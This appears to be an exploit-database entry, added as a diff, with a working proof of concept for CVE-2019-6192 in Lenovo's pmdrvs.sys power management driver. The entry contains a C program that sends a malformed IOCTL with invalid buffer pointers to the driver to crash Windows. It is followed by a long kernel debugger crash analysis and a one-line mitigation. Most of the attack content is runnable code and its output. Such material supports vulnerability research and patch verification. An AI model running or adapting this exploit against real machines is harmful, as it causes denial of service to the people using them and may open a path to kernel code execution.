@@ -1,0 +1,435 @@
+# Exploit Title: Lenovo Power Management Driver 1.67.17.48 - 'pmdrvs.sys' Denial of Service (PoC)
+# Date: 2019-12-11
+# Exploit Author: Nassim Asrir
+# CVE: CVE-2019-6192
+# Tested On: Windows 10(64bit) | ThinkPad T470p
+# Vendor : https://www.lenovo.com/us/en/
+# Ref : https://support.lenovo.com/us/fr/solutions/len-29334
+
+# Description
+# A vulnerability in pmdrvs.sys driver has been discovered in Lenovo Power Management Driver
+# The vulnerability exists due to insuffiecient input buffer validation when the driver processes IOCTL codes
+# Attackers can exploit this issue to cause a Denial of Service or possibly execute arbitrary code in kernel space.
+
+# Exploit
+
+#include <windows.h>
+#include <stdio.h>
+#include <conio.h>
+
+int main(int argc, char **argv)
+{
+    HANDLE   hDevice;
+    DWORD    bret;
+    char     szDevice[] = "\\\\.\\pmdrvs";
+
+    printf("--[ Lenovo Power Management Driver pmdrvs.sys Denial Of Service ]--\n");
+
+    printf("Opening handle to driver..\n");
+   
+    if ((hDevice = CreateFileA(szDevice, GENERIC_READ | GENERIC_WRITE,0,0,OPEN_EXISTING,0,NULL)) != INVALID_HANDLE_VALUE)    {
+        printf("Device %s succesfully opened!\n", szDevice);
+        printf("\tHandle: %p\n", hDevice);
+    }
+    else
+    {
+        printf("Error: Error opening device %s\n", szDevice);
+    }
+
+    printf("\nPress any key to DoS..");
+    _getch();
+
+    bret = 0;
+   
+    if (!DeviceIoControl(hDevice, 0x80862013, (LPVOID)0xdeadbeef, 0x0, (LPVOID)0xdeadbeef, 0x0, &bret, NULL))
+    {
+        printf("DeviceIoControl Error - bytes returned %#x\n", bret);
+    }
+
+    CloseHandle(hDevice);
+    return 0;
+}
+
+
+# RCA
+
+2: kd> !analyze -v
+*******************************************************************************
+*                                                                             *
+*                        Bugcheck Analysis                                    *
+*                                                                             *
+*******************************************************************************
+
+SYSTEM_SERVICE_EXCEPTION (3b)
+An exception happened while executing a system service routine.
+Arguments:
+Arg1: 00000000c0000005, Exception code that caused the bugcheck
+Arg2: fffff80428bf109d, Address of the instruction which caused the bugcheck
+Arg3: ffffc709dee8ec50, Address of the context record for the exception that caused the bugcheck
+Arg4: 0000000000000000, zero.
+
+FAULTING_IP:
+pmdrvs+109d
+fffff804`28bf109d 8b07            mov     eax,dword ptr [rdi]
+
+CONTEXT:  ffffc709dee8ec50 -- (.cxr 0xffffc709dee8ec50)
+rax=fffff80428bf5020 rbx=ffffca04ca8f80a0 rcx=ffffc709dee8f6d8
+rdx=ffffca04ca8f8170 rsi=ffffca04ca8f8170 rdi=0000000000000000
+rip=fffff80428bf109d rsp=ffffc709dee8f640 rbp=ffffca04cc188290
+ r8=000000000000000e  r9=ffffca04c1ca8d40 r10=fffff80428bf5020
+r11=ffffc709dee8f6b8 r12=0000000000000000 r13=ffffca04c1ca8d40
+r14=0000000000000002 r15=0000000000000000
+iopl=0         nv up ei pl zr na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+pmdrvs+0x109d:
+fffff804`28bf109d 8b07            mov     eax,dword ptr [rdi] ds:002b:00000000`00000000=????????
+Resetting default scope
+
+CPU_COUNT: 8
+
+CPU_MHZ: af8
+
+CPU_VENDOR:  GenuineIntel
+
+CPU_FAMILY: 6
+
+CPU_MODEL: 9e
+
+CPU_STEPPING: 9
+
+CPU_MICROCODE: 0,0,0,0 (F,M,S,R)  SIG: 8E'00000000 (cache) 0'00000000 (init)
+
+BLACKBOXBSD: 1 (!blackboxbsd)
+
+
+BLACKBOXPNP: 1 (!blackboxpnp)
+
+
+CURRENT_IRQL:  0
+
+ANALYSIS_SESSION_HOST:  LAPTOP-SP
+
+ANALYSIS_SESSION_TIME:  09-30-2019 20:29:54.0485
+
+ANALYSIS_VERSION: 10.0.17763.132 amd64fre
+
+LAST_CONTROL_TRANSFER:  from fffff80428bf5060 to fffff80428bf109d
+
+STACK_TEXT: 
+ffffc709`dee8f640 fffff804`28bf5060 : 00000000`00000000 ffff9980`05b00099 00000000`00000000 00000000`00000000 : pmdrvs+0x109d
+ffffc709`dee8f6c0 fffff804`1f12dba9 : ffffca04`ca8f80a0 fffff804`1f6d6224 ffffca04`cc51ff20 00000000`00000000 : pmdrvs+0x5060
+ffffc709`dee8f6f0 fffff804`1f6abb11 : ffffc709`dee8fa80 ffffca04`ca8f80a0 00000000`00000001 ffffca04`cc188290 : nt!IofCallDriver+0x59
+ffffc709`dee8f730 fffff804`1f6d763c : ffffca04`00000000 ffffca04`cc188290 ffffc709`dee8fa80 ffffc709`dee8fa80 : nt!NtQueryInformationFile+0x1071
+ffffc709`dee8f7e0 fffff804`1f64c356 : 00007fff`2fd66712 00000000`00000000 00000000`00000000 00000000`00000000 : nt!NtClose+0xffc
+ffffc709`dee8f920 fffff804`1f27a305 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!NtDeviceIoControlFile+0x56
+ffffc709`dee8f990 00007fff`33aaf844 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!setjmpex+0x7925
+00000000`0068fcf8 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : 0x00007fff`33aaf844
+
+
+THREAD_SHA1_HASH_MOD_FUNC:  fea423dc9c9c08c703f6d9d5b0d8f7062b0ece68
+
+THREAD_SHA1_HASH_MOD_FUNC_OFFSET:  4653d18777ce51b05029c753677fc2c05d5811bb
+
+THREAD_SHA1_HASH_MOD:  c2a3dbda00dbcf5ade5303449052a7349d5c580b
+
+FOLLOWUP_IP:
+pmdrvs+109d
+fffff804`28bf109d 8b07            mov     eax,dword ptr [rdi]
+
+FAULT_INSTR_CODE:  8941078b
+
+SYMBOL_STACK_INDEX:  0
+
+FOLLOWUP_NAME:  MachineOwner
+
+STACK_COMMAND:  .cxr 0xffffc709dee8ec50 ; kb
+
+BUGCHECK_STR:  2E8B5A19
+
+EXCEPTION_CODE_STR:  2E8B5A19
+
+EXCEPTION_STR:  WRONG_SYMBOLS
+
+PROCESS_NAME:  ntoskrnl.wrong.symbols.exe
+
+IMAGE_NAME:  ntoskrnl.wrong.symbols.exe
+
+MODULE_NAME: nt_wrong_symbols
+
+SYMBOL_NAME:  nt_wrong_symbols!2E8B5A19A70000
+
+BUCKET_ID:  WRONG_SYMBOLS_X64_17763.1.amd64fre.rs5_release.180914-1434_TIMESTAMP_940930-002145
+
+DEFAULT_BUCKET_ID:  WRONG_SYMBOLS_X64_17763.1.amd64fre.rs5_release.180914-1434_TIMESTAMP_940930-002145
+
+PRIMARY_PROBLEM_CLASS:  WRONG_SYMBOLS
+
+FAILURE_BUCKET_ID:  WRONG_SYMBOLS_X64_17763.1.amd64fre.rs5_release.180914-1434_TIMESTAMP_940930-002145_2E8B5A19_nt_wrong_symbols!2E8B5A19A70000
+
+TARGET_TIME:  2019-09-30T19:27:36.000Z
+
+OSBUILD:  17763
+
+OSSERVICEPACK:  0
+
+SERVICEPACK_NUMBER: 0
+
+OS_REVISION: 0
+
+SUITE_MASK:  272
+
+PRODUCT_TYPE:  1
+
+OSPLATFORM_TYPE:  x64
+
+OSNAME:  Windows 10
+
+OSEDITION:  Windows 10 WinNt TerminalServer SingleUserTS
+
+OS_LOCALE: 
+
+USER_LCID:  0
+
+OSBUILD_TIMESTAMP:  1994-09-30 01:21:45
+
+BUILDDATESTAMP_STR:  180914-1434
+
+BUILDLAB_STR:  rs5_release
+
+BUILDOSVER_STR:  10.0.17763.1.amd64fre.rs5_release.180914-1434
+
+ANALYSIS_SESSION_ELAPSED_TIME:  ae
+
+ANALYSIS_SOURCE:  KM
+
+FAILURE_ID_HASH_STRING:  km:wrong_symbols_x64_17763.1.amd64fre.rs5_release.180914-1434_timestamp_940930-002145_2e8b5a19_nt_wrong_symbols!2e8b5a19a70000
+
+FAILURE_ID_HASH:  {f0486cd4-fec7-73b9-14c0-31bcf2dd24e1}
+
+Followup:     MachineOwner
+---------
+
+2: kd> u fffff804`28bf109d
+pmdrvs+0x109d:
+fffff804`28bf109d 8b07            mov     eax,dword ptr [rdi]
+fffff804`28bf109f 41894308        mov     dword ptr [r11+8],eax
+fffff804`28bf10a3 e858ffffff      call    pmdrvs+0x1000 (fffff804`28bf1000)
+fffff804`28bf10a8 85c0            test    eax,eax
+fffff804`28bf10aa 0f8582000000    jne     pmdrvs+0x1132 (fffff804`28bf1132)
+fffff804`28bf10b0 488b8c2498000000 mov     rcx,qword ptr [rsp+98h]
+fffff804`28bf10b8 4885c9          test    rcx,rcx
+fffff804`28bf10bb 7475            je      pmdrvs+0x1132 (fffff804`28bf1132)
+2: kd> !for_each_frame .frame /r @$Frame
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+00 ffffc709`dee8e318 fffff804`1f27a8e9 nt!KeBugCheckEx
+00 ffffc709`dee8e318 fffff804`1f27a8e9 nt!KeBugCheckEx
+rax=ffffc709dee8e420 rbx=ffffc709dee8fa00 rcx=000000000000003b
+rdx=00000000c0000005 rsi=ffffc709dee8eaf0 rdi=0000000000000000
+rip=fffff8041f269040 rsp=ffffc709dee8e318 rbp=ffffc709dee8ea10
+ r8=fffff80428bf109d  r9=ffffc709dee8ec50 r10=0000000000000000
+r11=000000001f0b5000 r12=fffff8041f27a305 r13=ffffc709dee8e510
+r14=0000000000000000 r15=ffffc709dee8f408
+iopl=0         nv up ei ng nz na pe nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
+nt!KeBugCheckEx:
+fffff804`1f269040 48894c2408      mov     qword ptr [rsp+8],rcx ss:0018:ffffc709`dee8e320=000000000000003b
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+01 ffffc709`dee8e320 fffff804`1f279d3c nt!setjmpex+0x7f09
+01 ffffc709`dee8e320 fffff804`1f279d3c nt!setjmpex+0x7f09
+rax=ffffc709dee8e420 rbx=ffffc709dee8fa00 rcx=000000000000003b
+rdx=00000000c0000005 rsi=ffffc709dee8eaf0 rdi=0000000000000000
+rip=fffff8041f27a8e9 rsp=ffffc709dee8e320 rbp=ffffc709dee8ea10
+ r8=fffff80428bf109d  r9=ffffc709dee8ec50 r10=0000000000000000
+r11=000000001f0b5000 r12=fffff8041f27a305 r13=ffffc709dee8e510
+r14=0000000000000000 r15=ffffc709dee8f408
+iopl=0         nv up ei ng nz na pe nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
+nt!setjmpex+0x7f09:
+fffff804`1f27a8e9 90              nop
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+02 ffffc709`dee8e460 fffff804`1f271b4f nt!setjmpex+0x735c
+02 ffffc709`dee8e460 fffff804`1f271b4f nt!setjmpex+0x735c
+rax=ffffc709dee8e420 rbx=ffffc709dee8fa00 rcx=000000000000003b
+rdx=00000000c0000005 rsi=ffffc709dee8eaf0 rdi=0000000000000000
+rip=fffff8041f279d3c rsp=ffffc709dee8e460 rbp=ffffc709dee8ea10
+ r8=fffff80428bf109d  r9=ffffc709dee8ec50 r10=0000000000000000
+r11=000000001f0b5000 r12=fffff8041f27a305 r13=ffffc709dee8e510
+r14=0000000000000000 r15=ffffc709dee8f408
+iopl=0         nv up ei ng nz na pe nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
+nt!setjmpex+0x735c:
+fffff804`1f279d3c b801000000      mov     eax,1
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+03 ffffc709`dee8e4a0 fffff804`1f1ca460 nt!_chkstk+0x41f
+03 ffffc709`dee8e4a0 fffff804`1f1ca460 nt!_chkstk+0x41f
+rax=ffffc709dee8e420 rbx=ffffc709dee8fa00 rcx=000000000000003b
+rdx=00000000c0000005 rsi=ffffc709dee8eaf0 rdi=0000000000000000
+rip=fffff8041f271b4f rsp=ffffc709dee8e4a0 rbp=ffffc709dee8ea10
+ r8=fffff80428bf109d  r9=ffffc709dee8ec50 r10=0000000000000000
+r11=000000001f0b5000 r12=fffff8041f27a305 r13=ffffc709dee8e510
+r14=0000000000000000 r15=ffffc709dee8f408
+iopl=0         nv up ei ng nz na pe nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
+nt!_chkstk+0x41f:
+fffff804`1f271b4f 0f1f00          nop     dword ptr [rax]
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+04 ffffc709`dee8e4d0 fffff804`1f0d7c24 nt!RtlUnwindEx+0x3440
+04 ffffc709`dee8e4d0 fffff804`1f0d7c24 nt!RtlUnwindEx+0x3440
+rax=ffffc709dee8e420 rbx=ffffc709dee8fa00 rcx=000000000000003b
+rdx=00000000c0000005 rsi=ffffc709dee8eaf0 rdi=0000000000000000
+rip=fffff8041f1ca460 rsp=ffffc709dee8e4d0 rbp=ffffc709dee8ea10
+ r8=fffff80428bf109d  r9=ffffc709dee8ec50 r10=0000000000000000
+r11=000000001f0b5000 r12=fffff8041f27a305 r13=ffffc709dee8e510
+r14=0000000000000000 r15=ffffc709dee8f408
+iopl=0         nv up ei ng nz na pe nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
+nt!RtlUnwindEx+0x3440:
+fffff804`1f1ca460 8bd0            mov     edx,eax
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+05 ffffc709`dee8ec20 fffff804`1f27a9c2 nt!ExReleaseAutoExpandPushLockExclusive+0x264
+05 ffffc709`dee8ec20 fffff804`1f27a9c2 nt!ExReleaseAutoExpandPushLockExclusive+0x264
+rax=ffffc709dee8e420 rbx=ffffc709dee8f408 rcx=000000000000003b
+rdx=00000000c0000005 rsi=ffffc709dee8ec50 rdi=0000000000000000
+rip=fffff8041f0d7c24 rsp=ffffc709dee8ec20 rbp=ffffc709dee8f150
+ r8=fffff80428bf109d  r9=ffffc709dee8ec50 r10=0000000000000000
+r11=000000001f0b5000 r12=000000000010001f r13=ffffca04c1ca8d40
+r14=ffffc709dee8f4b0 r15=0000000000000000
+iopl=0         nv up ei ng nz na pe nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
+nt!ExReleaseAutoExpandPushLockExclusive+0x264:
+fffff804`1f0d7c24 84c0            test    al,al
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+06 ffffc709`dee8f2d0 fffff804`1f276cae nt!setjmpex+0x7fe2
+06 ffffc709`dee8f2d0 fffff804`1f276cae nt!setjmpex+0x7fe2
+rax=ffffc709dee8e420 rbx=ffffca04ca8f80a0 rcx=000000000000003b
+rdx=00000000c0000005 rsi=ffffca04ca8f8170 rdi=0000000000000000
+rip=fffff8041f27a9c2 rsp=ffffc709dee8f2d0 rbp=ffffc709dee8f530
+ r8=fffff80428bf109d  r9=ffffc709dee8ec50 r10=0000000000000000
+r11=000000001f0b5000 r12=0000000000000000 r13=ffffca04c1ca8d40
+r14=0000000000000002 r15=0000000000000000
+iopl=0         nv up ei ng nz na pe nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
+nt!setjmpex+0x7fe2:
+fffff804`1f27a9c2 488d8c2400010000 lea     rcx,[rsp+100h]
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+07 ffffc709`dee8f4b0 fffff804`28bf109d nt!setjmpex+0x42ce
+07 ffffc709`dee8f4b0 fffff804`28bf109d nt!setjmpex+0x42ce
+rax=ffffc709dee8e420 rbx=ffffca04ca8f80a0 rcx=000000000000003b
+rdx=00000000c0000005 rsi=ffffca04ca8f8170 rdi=0000000000000000
+rip=fffff8041f276cae rsp=ffffc709dee8f4b0 rbp=ffffc709dee8f530
+ r8=fffff80428bf109d  r9=ffffc709dee8ec50 r10=0000000000000000
+r11=000000001f0b5000 r12=0000000000000000 r13=ffffca04c1ca8d40
+r14=0000000000000002 r15=0000000000000000
+iopl=0         nv up ei ng nz na pe nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
+nt!setjmpex+0x42ce:
+fffff804`1f276cae 440f20c0        mov     rax,cr8
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+08 ffffc709`dee8f640 fffff804`28bf5060 pmdrvs+0x109d
+08 ffffc709`dee8f640 fffff804`28bf5060 pmdrvs+0x109d
+rax=fffff80428bf5020 rbx=ffffca04ca8f80a0 rcx=ffffc709dee8f6d8
+rdx=ffffca04ca8f8170 rsi=ffffca04ca8f8170 rdi=0000000000000000
+rip=fffff80428bf109d rsp=ffffc709dee8f640 rbp=ffffca04cc188290
+ r8=000000000000000e  r9=ffffca04c1ca8d40 r10=fffff80428bf5020
+r11=ffffc709dee8f6b8 r12=0000000000000000 r13=ffffca04c1ca8d40
+r14=0000000000000002 r15=0000000000000000
+iopl=0         nv up ei ng nz na pe nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
+pmdrvs+0x109d:
+fffff804`28bf109d 8b07            mov     eax,dword ptr [rdi] ds:002b:00000000`00000000=????????
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+09 ffffc709`dee8f6c0 fffff804`1f12dba9 pmdrvs+0x5060
+09 ffffc709`dee8f6c0 fffff804`1f12dba9 pmdrvs+0x5060
+rax=fffff80428bf5020 rbx=ffffca04ca8f80a0 rcx=ffffc709dee8f6d8
+rdx=ffffca04ca8f8170 rsi=0000000000000001 rdi=0000000000000000
+rip=fffff80428bf5060 rsp=ffffc709dee8f6c0 rbp=ffffca04cc188290
+ r8=000000000000000e  r9=ffffca04c1ca8d40 r10=fffff80428bf5020
+r11=ffffc709dee8f6b8 r12=0000000000000000 r13=ffffca04c1ca8d40
+r14=0000000000000002 r15=0000000000000000
+iopl=0         nv up ei ng nz na pe nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
+pmdrvs+0x5060:
+fffff804`28bf5060 eb28            jmp     pmdrvs+0x508a (fffff804`28bf508a)
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+0a ffffc709`dee8f6f0 fffff804`1f6abb11 nt!IofCallDriver+0x59
+0a ffffc709`dee8f6f0 fffff804`1f6abb11 nt!IofCallDriver+0x59
+rax=fffff80428bf5020 rbx=ffffca04ca8f80a0 rcx=ffffc709dee8f6d8
+rdx=ffffca04ca8f8170 rsi=0000000000000001 rdi=ffffca04cc188290
+rip=fffff8041f12dba9 rsp=ffffc709dee8f6f0 rbp=ffffca04cc188290
+ r8=000000000000000e  r9=ffffca04c1ca8d40 r10=fffff80428bf5020
+r11=ffffc709dee8f6b8 r12=0000000000000000 r13=ffffca04c1ca8d40
+r14=0000000000000002 r15=0000000000000000
+iopl=0         nv up ei ng nz na pe nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
+nt!IofCallDriver+0x59:
+fffff804`1f12dba9 4883c438        add     rsp,38h
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+0b ffffc709`dee8f730 fffff804`1f6d763c nt!NtQueryInformationFile+0x1071
+0b ffffc709`dee8f730 fffff804`1f6d763c nt!NtQueryInformationFile+0x1071
+rax=fffff80428bf5020 rbx=ffffca04ca8f80a0 rcx=ffffc709dee8f6d8
+rdx=ffffca04ca8f8170 rsi=0000000000000001 rdi=ffffca04cc188290
+rip=fffff8041f6abb11 rsp=ffffc709dee8f730 rbp=ffffca04cc188290
+ r8=000000000000000e  r9=ffffca04c1ca8d40 r10=fffff80428bf5020
+r11=ffffc709dee8f6b8 r12=0000000000000000 r13=ffffca04c1ca8d40
+r14=0000000000000002 r15=0000000000000000
+iopl=0         nv up ei ng nz na pe nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
+nt!NtQueryInformationFile+0x1071:
+fffff804`1f6abb11 448bf0          mov     r14d,eax
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+0c ffffc709`dee8f7e0 fffff804`1f64c356 nt!NtClose+0xffc
+0c ffffc709`dee8f7e0 fffff804`1f64c356 nt!NtClose+0xffc
+rax=fffff80428bf5020 rbx=ffffca04cc188290 rcx=ffffc709dee8f6d8
+rdx=ffffca04ca8f8170 rsi=0000000000000000 rdi=ffffca04ca8f80a0
+rip=fffff8041f6d763c rsp=ffffc709dee8f7e0 rbp=ffffc709dee8fa80
+ r8=000000000000000e  r9=ffffca04c1ca8d40 r10=fffff80428bf5020
+r11=ffffc709dee8f6b8 r12=ffffca04ca8f81b8 r13=fffff780000002dc
+r14=0000000000000000 r15=0000000000000000
+iopl=0         nv up ei ng nz na pe nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
+nt!NtClose+0xffc:
+fffff804`1f6d763c eb25            jmp     nt!NtClose+0x1023 (fffff804`1f6d7663)
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+0d ffffc709`dee8f920 fffff804`1f27a305 nt!NtDeviceIoControlFile+0x56
+0d ffffc709`dee8f920 fffff804`1f27a305 nt!NtDeviceIoControlFile+0x56
+rax=fffff80428bf5020 rbx=ffffca04c88b3080 rcx=ffffc709dee8f6d8
+rdx=ffffca04ca8f8170 rsi=000000000068fd18 rdi=ffffc709dee8f9a8
+rip=fffff8041f64c356 rsp=ffffc709dee8f920 rbp=ffffc709dee8fa80
+ r8=000000000000000e  r9=ffffca04c1ca8d40 r10=fffff80428bf5020
+r11=ffffc709dee8f6b8 r12=0000000000000000 r13=0000000000000010
+r14=0000000000000000 r15=0000000000000000
+iopl=0         nv up ei ng nz na pe nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
+nt!NtDeviceIoControlFile+0x56:
+fffff804`1f64c356 4883c468        add     rsp,68h
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+0e ffffc709`dee8f990 00007fff`33aaf844 nt!setjmpex+0x7925
+0e ffffc709`dee8f990 00007fff`33aaf844 nt!setjmpex+0x7925
+rax=fffff80428bf5020 rbx=ffffca04c88b3080 rcx=ffffc709dee8f6d8
+rdx=ffffca04ca8f8170 rsi=000000000068fd18 rdi=ffffc709dee8f9a8
+rip=fffff8041f27a305 rsp=ffffc709dee8f990 rbp=ffffc709dee8fa80
+ r8=000000000000000e  r9=ffffca04c1ca8d40 r10=fffff80428bf5020
+r11=ffffc709dee8f6b8 r12=0000000000000000 r13=0000000000000010
+r14=0000000000000000 r15=0000000000000000
+iopl=0         nv up ei ng nz na pe nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
+nt!setjmpex+0x7925:
+fffff804`1f27a305 0f1f00          nop     dword ptr [rax]
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+0f 00000000`0068fcf8 00000000`00000000 0x00007fff`33aaf844
+0f 00000000`0068fcf8 00000000`00000000 0x00007fff`33aaf844
+rax=fffff80428bf5020 rbx=0000000000000000 rcx=ffffc709dee8f6d8
+rdx=ffffca04ca8f8170 rsi=00000000deadbeef rdi=000000000000004c
+rip=00007fff33aaf844 rsp=000000000068fcf8 rbp=000000000000004c
+ r8=000000000000000e  r9=ffffca04c1ca8d40 r10=fffff80428bf5020
+r11=ffffc709dee8f6b8 r12=0000000000000000 r13=0000000000000010
+r14=0000000000000000 r15=0000000000000000
+iopl=0         nv up ei ng nz na pe nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
+00007fff`33aaf844 ??              ???
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+00 ffffc709`dee8e318 fffff804`1f27a8e9 nt!KeBugCheckEx
+
+# Mitigation
+
+Update to Lenovo Power Management driver version 1.67.17.48 or higher
